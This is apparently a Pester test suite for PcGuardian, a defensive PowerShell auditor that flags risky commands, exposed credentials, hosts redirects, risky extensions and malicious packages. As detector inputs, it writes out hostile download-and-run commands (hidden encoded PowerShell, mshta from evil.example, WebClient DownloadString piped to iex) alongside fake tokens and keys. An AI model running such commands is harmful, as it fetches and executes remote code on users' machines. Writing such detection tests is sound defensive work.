BeforeAll {
    Import-Module (Join-Path $PSScriptRoot '..\src\PcGuardian\PcGuardian.psd1') -Force
    function script:NewDir { $d = Join-Path ([IO.Path]::GetTempPath()) ([guid]::NewGuid()); New-Item -ItemType Directory -Path $d | Out-Null; $d }
    # An OpenSSH private key file with the given cipher name ("none" means no passphrase). Not a real key.
    function script:FakeSshKey($cipher) {
        $b = New-Object System.Collections.Generic.List[byte]
        $b.AddRange([Text.Encoding]::ASCII.GetBytes('openssh-key-v1')); $b.Add(0)
        $len = $cipher.Length
        $b.AddRange([byte[]](0, 0, 0, $len)); $b.AddRange([Text.Encoding]::ASCII.GetBytes($cipher))
        $b.AddRange([byte[]](1..40))
        "-----BEGIN OPENSSH PRIVATE KEY-----`n$([Convert]::ToBase64String($b.ToArray()))`n-----END OPENSSH PRIVATE KEY-----`n"
    }
}

Describe 'Get-CommandRisk' {
    It 'rates encoded and downloader commands as strong' {
        InModuleScope PcGuardian {
            Get-CommandRisk -Text 'powershell -nop -w hidden -enc SQBFAFgA' | Should -Be 'Strong'
            Get-CommandRisk -Text 'mshta http://evil.example/a.hta' | Should -Be 'Strong'
            Get-CommandRisk -Text 'iex (New-Object Net.WebClient).DownloadString("http://x/y")' | Should -Be 'Strong'
        }
    }
    It 'rates plain download-and-run as weak and ordinary commands as nothing' {
        InModuleScope PcGuardian {
            Get-CommandRisk -Text 'irm https://example.com/install.ps1 | iex' | Should -Be 'Weak'
            Get-CommandRisk -Text 'notepad' | Should -BeNullOrEmpty
            Get-CommandRisk -Text 'git status' | Should -BeNullOrEmpty
        }
    }
    It 'hides secrets when formatting a command for display' {
        InModuleScope PcGuardian {
            $t = Format-CommandForDisplay -Text 'curl -H "Authorization: Bearer abc123SECRETvalue" https://x'
            $t | Should -Not -Match 'abc123SECRETvalue'
            $t | Should -Match 'hidden'
        }
    }
}

Describe 'Get-ClickFixTraceAudit' {
    It 'reports a suspicious history line, marks a plain installer weak, and ignores normal commands' {
        InModuleScope PcGuardian {
            $f = Join-Path ([IO.Path]::GetTempPath()) "$([guid]::NewGuid()).txt"
            Set-Content $f -Value @('git status', 'irm https://example.com/i.ps1 | iex', 'powershell -w hidden -enc SQBFAFgA')
            $r = @(Get-ClickFixTraceAudit -HistoryPath $f -RunMruKey 'HKCU:\Software\PcGuardianDoesNotExist')
            $r.Count | Should -Be 2
            (@($r | Where-Object { (Get-FindingSeverity -Finding $_) -eq 'Alert' })).Count | Should -Be 1
        }
    }
}

Describe 'Get-CredentialExposureAudit' {
    It 'finds tokens and unprotected keys without ever showing the secret' {
        $home1 = NewDir; $proj = NewDir
        $token = 'ghp_' + ('a' * 36)
        Set-Content (Join-Path $home1 '.npmrc') -Value '//registry.npmjs.org/:_authToken=npm_0123456789abcdef0123456789abcdef0123'
        New-Item -ItemType Directory -Path (Join-Path $home1 '.ssh') | Out-Null
        Set-Content (Join-Path $home1 '.ssh\id_ed25519') -Value (FakeSshKey 'none') -NoNewline
        Set-Content (Join-Path $home1 '.ssh\id_rsa') -Value (FakeSshKey 'aes256-ctr') -NoNewline
        Set-Content (Join-Path $proj '.env') -Value "GITHUB_TOKEN=$token"
        Set-Content (Join-Path $proj '.env.example') -Value "GITHUB_TOKEN=$token"
        New-Item -ItemType Directory -Path (Join-Path $proj 'node_modules\pkg') -Force | Out-Null
        Set-Content (Join-Path $proj 'node_modules\pkg\.env') -Value "GITHUB_TOKEN=$token"

        $r = @(InModuleScope PcGuardian -Parameters @{ h = $home1; p = $proj } { param($h, $p) Get-CredentialExposureAudit -HomePath $h -Roots @($p) })
        @($r | Where-Object Key -like 'Credential:KnownFile:*').Count | Should -Be 1
        @($r | Where-Object Key -like 'Credential:SshKey:*id_ed25519').Count | Should -Be 1
        @($r | Where-Object Key -like 'Credential:SshKey:*id_rsa').Count | Should -Be 0
        @($r | Where-Object Key -like 'Credential:GitHubtoken:*').Count | Should -Be 1     # .env only: not the example, not node_modules
        ($r | ForEach-Object { $_.Detail + $_.Key }) -join ' ' | Should -Not -Match 'ghp_a{10}'
        ($r | ForEach-Object { $_.Detail + $_.Key }) -join ' ' | Should -Not -Match 'npm_0123456789'
    }
    It 'rates plain-text tokens as alerts and an unprotected SSH key as info' {
        InModuleScope PcGuardian {
            Get-FindingSeverity -Finding (New-Finding -Category 'Credential' -Key 'Credential:GitHubtoken:C:\a\.env' -Detail 'x') | Should -Be 'Alert'
            Get-FindingSeverity -Finding (New-Finding -Category 'Credential' -Key 'Credential:SshKey:C:\a\id' -Detail 'x') | Should -Be 'Info'
        }
    }
}

Describe 'Persistence helpers' {
    It 'flags hosts entries that redirect traffic, not blocking entries' {
        InModuleScope PcGuardian {
            $f = Join-Path ([IO.Path]::GetTempPath()) "$([guid]::NewGuid()).hosts"
            Set-Content $f -Value @('# comment', '127.0.0.1 localhost', '0.0.0.0 ads.example.com', '203.0.113.9 bank.example.com')
            $r = @(Get-HostsFileAudit -Path $f)
            $r.Count | Should -Be 2
            (Get-FindingSeverity -Finding ($r | Where-Object Key -eq 'Hosts:bank.example.com')) | Should -Be 'Alert'
            (Get-FindingSeverity -Finding ($r | Where-Object Key -eq 'Hosts:ads.example.com')) | Should -Be 'Info'
        }
    }
    It 'marks a browser extension with all-sites plus cookies as risky' {
        $root = NewDir
        $ext = Join-Path $root 'Default\Extensions\abcdefgh\1.0'
        New-Item -ItemType Directory -Path $ext -Force | Out-Null
        Set-Content (Join-Path $ext 'manifest.json') -Value '{"name":"Shady Helper","version":"1.0","permissions":["cookies","<all_urls>"]}'
        $ext2 = Join-Path $root 'Default\Extensions\ijklmnop\2.0'
        New-Item -ItemType Directory -Path $ext2 -Force | Out-Null
        Set-Content (Join-Path $ext2 'manifest.json') -Value '{"name":"Dark Mode","version":"2.0","permissions":["storage"]}'
        $r = @(InModuleScope PcGuardian -Parameters @{ r = $root } { param($r) Get-BrowserExtensionAudit -Roots @{ Chrome = $r } })
        $r.Count | Should -Be 2
        ($r | Where-Object Detail -like '*Shady*').Category | Should -Be 'ExtensionRisk'
        (InModuleScope PcGuardian -Parameters @{ f = ($r | Where-Object Detail -like '*Shady*') } { param($f) Get-FindingSeverity -Finding $f }) | Should -Be 'Alert'
        (InModuleScope PcGuardian -Parameters @{ f = ($r | Where-Object Detail -like '*Dark Mode*') } { param($f) Get-FindingSeverity -Finding $f }) | Should -Be 'Info'
    }
    It 'treats a new Defender exclusion and a user-installed root certificate as alerts' {
        InModuleScope PcGuardian {
            Get-FindingSeverity -Finding (New-Finding -Category 'Persistence' -Key 'Defender:Exclusion:ExclusionPath:C:\x' -Detail 'd') | Should -Be 'Alert'
            Get-FindingSeverity -Finding (New-Finding -Category 'Certificate' -Key 'Cert:Root:CurrentUser:ABC' -Detail 'CN=x; user-installed, not in the system certificate stores') | Should -Be 'Alert'
            Get-FindingSeverity -Finding (New-Finding -Category 'Certificate' -Key 'Cert:Root:CurrentUser:DEF' -Detail 'CN=x (expires 2030-01-01)') | Should -Be 'Info'
            Get-FindingSeverity -Finding (New-Finding -Category 'Certificate' -Key 'Cert:Root:LocalMachine:ABC' -Detail 'd') | Should -Be 'Info'
        }
    }
}

Describe 'Package check' {
    It 'reads package-lock.json (v3) and pinned requirements.txt' {
        $d = NewDir
        Set-Content (Join-Path $d 'package-lock.json') -Value '{"lockfileVersion":3,"packages":{"":{"name":"app"},"node_modules/left-pad":{"version":"1.3.0"},"node_modules/a/node_modules/b":{"version":"2.0.0"}}}'
        Set-Content (Join-Path $d 'requirements.txt') -Value @('requests==2.31.0  # http', 'flask>=2', 'numpy[extra]==1.26.4 ; python_version > "3.8"')
        $r = InModuleScope PcGuardian -Parameters @{ d = $d } { param($d)
            @{ npm = @(ConvertFrom-PackageLock -Path (Join-Path $d 'package-lock.json')); pip = @(ConvertFrom-RequirementsTxt -Path (Join-Path $d 'requirements.txt')) } }
        ($r.npm | ForEach-Object { "$($_.Name)@$($_.Version)" } | Sort-Object) | Should -Be @('b@2.0.0', 'left-pad@1.3.0')
        ($r.pip | ForEach-Object { "$($_.Name)@$($_.Version)" } | Sort-Object) | Should -Be @('numpy@1.26.4', 'requests@2.31.0')
    }
    It 'reads the older package-lock.json (v1) nested dependencies format' {
        $d = NewDir
        Set-Content (Join-Path $d 'package-lock.json') -Value '{"lockfileVersion":1,"dependencies":{"a":{"version":"1.0.0","dependencies":{"b":{"version":"2.0.0"}}}}}'
        $r = @(InModuleScope PcGuardian -Parameters @{ d = $d } { param($d) ConvertFrom-PackageLock -Path (Join-Path $d 'package-lock.json') })
        ($r | ForEach-Object { "$($_.Name)@$($_.Version)" } | Sort-Object) | Should -Be @('a@1.0.0', 'b@2.0.0')
    }
    It 'turns OSV results into an alert for a malicious package and one info line per project file' {
        InModuleScope PcGuardian {
            $pk = @(
                [pscustomobject]@{ Ecosystem = 'npm'; Name = 'evil'; Version = '1.0.0'; Source = 'C:\p\package-lock.json' },
                [pscustomobject]@{ Ecosystem = 'npm'; Name = 'old';  Version = '1.0.0'; Source = 'C:\p\package-lock.json' },
                [pscustomobject]@{ Ecosystem = 'npm'; Name = 'old2'; Version = '1.0.0'; Source = 'C:\p\package-lock.json' },
                [pscustomobject]@{ Ecosystem = 'npm'; Name = 'fine'; Version = '1.0.0'; Source = 'C:\p\package-lock.json' })
            $res = @(
                [pscustomobject]@{ Vulns = @('MAL-2026-0001') }, [pscustomobject]@{ Vulns = @('GHSA-xxxx') },
                [pscustomobject]@{ Vulns = @('GHSA-yyyy') }, [pscustomobject]@{ Vulns = @() })
            $f = @(ConvertFrom-OsvResult -Packages $pk -Results $res)
            $f.Count | Should -Be 2
            (Get-FindingSeverity -Finding ($f | Where-Object Key -like 'Package:Malicious:*')) | Should -Be 'Alert'
            ($f | Where-Object Key -like 'Package:Vulnerable:*').Detail | Should -Match '^2 package'
        }
    }
    It 'sends nothing and says so when there are no code folders' {
        $oldProfile = $env:USERPROFILE; $oldRoots = $env:PCGUARDIAN_DEV_ROOTS
        try {
            $env:USERPROFILE = NewDir; $env:PCGUARDIAN_DEV_ROOTS = $null
            InModuleScope PcGuardian {
                Mock Invoke-OsvQuery { throw 'must not be called' }
                (Get-PackageRiskAudit).Key | Should -Be 'Package:NoFolders'
            }
        } finally { $env:USERPROFILE = $oldProfile; $env:PCGUARDIAN_DEV_ROOTS = $oldRoots }
    }
    It 'calls OSV once with only names and versions, and reports a malicious package' {
        $d = NewDir
        Set-Content (Join-Path $d 'package-lock.json') -Value '{"lockfileVersion":3,"packages":{"":{},"node_modules/evil-pkg":{"version":"1.0.0"}}}'
        $r = @(InModuleScope PcGuardian -Parameters @{ d = $d } { param($d)
            Mock Invoke-OsvQuery { @([pscustomobject]@{ Vulns = @('MAL-2026-1') }) }
            $f = @(Get-PackageRiskAudit -Roots @($d))
            Should -Invoke Invoke-OsvQuery -Times 1 -Exactly
            $f })
        $r.Count | Should -Be 1
        $r[0].Key | Should -Match '^Package:Malicious:npm:evil-pkg@1.0.0$'
    }
}

Describe 'Baseline upgrade for new checks' {
    It 'absorbs existing hiding-place items once instead of reporting them as new' {
        $d = NewDir
        Invoke-GuardianRun -DataPath $d -AsObject | Out-Null
        # Simulate a baseline saved before these checks existed.
        $cats = 'Service', 'Certificate', 'Hosts', 'Extension'
        $b = @(Get-Content (Join-Path $d 'baseline.json') -Raw | ConvertFrom-Json | ForEach-Object { $_ } | Where-Object { $_.Category -notin $cats })
        ConvertTo-Json -InputObject @($b) -Depth 4 | Set-Content (Join-Path $d 'baseline.json')
        Remove-Item (Join-Path $d 'baseline-checks.json')

        $r = Invoke-GuardianRun -DataPath $d -AsObject
        @($r.Items | Where-Object { $_.Kind -eq 'New' -and $_.Category -in $cats }).Count | Should -Be 0
        Test-Path (Join-Path $d 'baseline-checks.json') | Should -BeTrue
    }
}
